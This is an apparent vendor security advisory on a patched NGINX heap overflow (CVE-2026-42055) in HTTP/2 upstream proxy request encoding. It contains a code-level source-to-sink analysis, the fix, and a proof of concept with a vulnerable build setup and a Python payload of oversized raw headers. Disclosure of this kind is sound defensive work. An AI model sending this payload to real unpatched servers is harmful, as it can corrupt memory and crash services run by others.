---
schema_version: "1.0.0"
document_id: "8b41cd05c264994506aa5ef6f8b998b21b7c87d459e400ac4d7f4137b4703fae"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/nginx-proxy-v2-forwarded-header-hpack-overflow"
published_at: "2026-06-17T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T21:13:02.492982+00:00"
content_hash: "sha256:57034d7091d412add37c367393323c54f834558bb730494940845bccf65cff9c"
---

# HTTP/2 upstream proxy request encoder permits heap overflow with oversized raw headers (CVE-2026-42055)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


High


CVE-2026-42055


2026-06-17


# HTTP/2 upstream proxy request encoder permits heap overflow with oversized raw headers (CVE-2026-42055)


## Summary


NGINX HTTP/2 upstream proxy request encoding under-counted oversized raw forwarded headers


When` proxy_http_version 2` sends a request to an HTTP/2 upstream,` ngx_http_proxy_v2_create_request()` builds an HPACK-compressed request header block. Before the fix, the sizing pass used the same four-byte` NGX_HTTP_V2_INT_OCTETS` allowance for every forwarded header name and value length, but the serialization pass used the variable HPACK integer encoder.


A request with raw-encoded forwarded header names and values longer than` NGX_HTTP_V2_MAX_FIELD` makes the actual HPACK length prefix larger than the reserved budget. With enough oversized fields, the serialized header block plus in-place CONTINUATION-frame insertion exceeds the temporary upstream buffer allocation. The proof-backed sink is the` ngx_memmove()` continuation insertion loop in` ngx_http_proxy_v2_create_request()` .


This is the HTTP/2 proxy half of[CVE-2026-42055](https://www.cve.org/CVERecord?id=CVE-2026-42055) / F5 advisory[K000161584](https://my.f5.com/manage/s/article/K000161584) . The same NGINX 1.31.2 security entry covers both HTTP/2 and gRPC backends, and the F5 CVE record names` ngx_http_proxy_v2_module` and` ngx_http_grpc_module` as affected. NGINX fixed the proxy and gRPC request builders together in commit[26d824e](https://github.com/nginx/nginx/commit/26d824ec3a2f819300edce0ab3b055751c9843ff) , merged through[PR #1474](https://github.com/nginx/nginx/pull/1474) .


### CVSS Score


Vector


N


Complexity


H


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 878


src /http


/modules


/ngx_http_proxy_module.c


ngx_http_proxy_handler()


Sink


Line 808


src /http


/modules


/ngx_http_proxy_v2_module.c


ngx_http_proxy_v2_create_request()


## Source-to-Sink Analysis


1


src/http/ngx_http_request.c:1489-1519


With` ignore_invalid_headers off` , the HTTP/1.x request path stores invalid but accepted client header names and values in` r->headers_in.headers` instead of dropping them.


CPP


```text
if   (r->invalid_header && cscf->ignore_invalid_headers) {
continue  ;
}


h->key.len = r->header_name_end - r->header_name_start;
h->value.len = r->header_end - r->header_start;


```


2


src/http/modules/ngx_http_proxy_module.c:878-880


` proxy_http_version 2` dispatches the proxied request into the HTTP/2 upstream implementation. That path is reachable only for configurations using the HTTP/2 upstream proxy feature.


CPP


```text
if   (plcf->http_version == NGX_HTTP_VERSION_20) {
return    ngx_http_proxy_v2_handler  (r);
}


```


3


src/http/modules/ngx_http_proxy_v2_module.c:271


The HTTP/2 upstream proxy handler installs` ngx_http_proxy_v2_create_request()` as the request creator, so accepted client headers flow into this encoder when request-header forwarding is enabled.


CPP


```text
u->create_request = ngx_http_proxy_v2_create_request;


```


4


src/http/modules/ngx_http_proxy_v2_module.c:517-521 (before fix)


The vulnerable sizing pass added each pass-through header with a fixed four-octet HPACK length budget for the name and another four octets for the value.


CPP


```text
len +=  1   + NGX_HTTP_V2_INT_OCTETS + header[i].key.len
+ NGX_HTTP_V2_INT_OCTETS + header[i].value.len;


```


5


src/http/modules/ngx_http_proxy_v2_module.c:764-768 (before fix)


The serialization pass then wrote the same strings through the real HPACK encoder. Raw strings of 2,097,279 bytes require five HPACK length bytes, not four.


CPP


```text
b->last =  ngx_http_v2_write_name  (b->last, header[i].key.data,
header[i].key.len, tmp);
b->last =  ngx_http_v2_write_value  (b->last, header[i].value.data,
header[i].value.len, tmp);


```


6


src/http/modules/ngx_http_proxy_v2_module.c:808-809 (before fix)


After serialization, the request builder inserts CONTINUATION frame headers in place with` ngx_memmove()` . The underestimated HPACK block can leave too little slack, turning the frame insertion into the final out-of-bounds write.


CPP


```text
ngx_memmove  (b->pos + n +  sizeof  ( ngx_http_proxy_v2_frame_t  ),
b->pos + n, b->last - b->pos - n);


```


7


src/http/modules/ngx_http_proxy_v2_module.c:517-570 (fix, commit 26d824e)


The fix applies the same` NGX_HTTP_V2_MAX_FIELD` guard used by HTTP/2 response header sizing before accounting pass-through request header names and values.


CPP


```text
if   (header[i].key.len > NGX_HTTP_V2_MAX_FIELD) {
ngx_log_error  (NGX_LOG_ERR, r->connection->log,  0  ,
"too long http2 header name: \"%V\""  ,
&header[i].key);
return   NGX_ERROR;
}


if   (header[i].value.len > NGX_HTTP_V2_MAX_FIELD) {
ngx_log_error  (NGX_LOG_ERR, r->connection->log,  0  ,
"too long http2 header value: \"%V: %V\""  ,
&header[i].key, &header[i].value);
return   NGX_ERROR;
}


len +=  1   + NGX_HTTP_V2_INT_OCTETS + header[i].key.len
+ NGX_HTTP_V2_INT_OCTETS + header[i].value.len;


```


## Impact Analysis


### Critical Impact


The proven impact is a remote, unauthenticated heap out-of-bounds write in an NGINX worker under restrictive non-default configuration. The ASAN proof confirms a write in` ngx_http_proxy_v2_create_request()` at the continuation-frame movement sink. Without ASAN, observable behavior depends on allocator state and may range from a failed upstream request to worker crash or memory corruption.


### Attack Surface


NGINX Open Source deployments using` proxy_http_version 2` to proxy requests to HTTP/2 upstreams. The HTTP/2 upstream proxy feature was introduced in the 1.29.x line, and the combined CVE is fixed in Open Source` 1.31.2+` and` 1.30.3+` .


### Preconditions


The request must reach a` proxy_pass` location configured with` proxy_http_version 2` ;` proxy_pass_request_headers` must be enabled, which is the default;` ignore_invalid_headers off` must allow raw-unfriendly header names; and` large_client_header_buffers` must permit multi-megabyte header lines. The worker must also be able to allocate the large request header buffers and upstream request buffer.


## Proof of Concept


### Environment Setup


Build a vulnerable NGINX checkout before commit` 26d824e` , such as` e8053c867f9ab14f323e3019ccab585d857abb66` , with ASAN and HTTP/2 support:


BASH


```text
./auto/configure --with-http_v2_module --with-debug \
--with-cc-opt= '-O1 -g -fsanitize=address -fno-omit-frame-pointer'   \
--with-ld-opt= '-fsanitize=address'
make -j " $(getconf _NPROCESSORS_ONLN 2>/dev/null || sysctl -n hw.ncpu)  "


```


### Target Configuration


Run a disposable localhost-only proxy with HTTP/2 upstream mode and permissive header parsing:


NGINX


```text
worker_processes 1;
master_process off;
daemon off;
error_log logs/error.log debug;


events { worker_connections 1024; }


http {
access_log off;
ignore_invalid_headers off;
large_client_header_buffers 16 5m;


server {
listen 127.0.0.1:<front_port>;
location / {
proxy_http_version 2;
proxy_pass http://127.0.0.1:<unused_loopback_port>;
}
}
}


```


### Exploit Delivery


Send seven pass-through headers whose names and values are each 2,097,279` ~` bytes:


PYTHON


```text
payload =  bytearray  ( b"GET / HTTP/1.1\r\nHost: localhost\r\n"  )
for   _  in    range  ( 7  ):
payload.extend( b"~"   *  2097279  )
payload.extend( b": "  )
payload.extend( b"~"   *  2097279  )
payload.extend( b"\r\n"  )
payload.extend( b"Connection: close\r\n\r\n"  )


sock.sendall(payload)


```


The proof model reported` budget_total=29362070` ,` allocated=29378198` ,` final_size=29378200` , and` overflow_bytes=2` .


### Outcome


The proof confirms heap memory corruption while building the upstream HTTP/2 proxy request. After commit` 26d824e` , the oversized forwarded header name or value is rejected before HPACK serialization, and the ASAN heap-buffer-overflow no longer appears.


**Expected Response:** A vulnerable ASAN build reports:


TEXT


```text
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 1871
SUMMARY: AddressSanitizer: heap-buffer-overflow ngx_http_proxy_v2_module.c:808 in ngx_http_proxy_v2_create_request
CONFIRMED: ASAN heap-buffer-overflow in ngx_http_proxy_v2_create_request with oversized raw '~' names and values


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/commit/26d824ec3a2f819300edce0ab3b055751c9843ff)
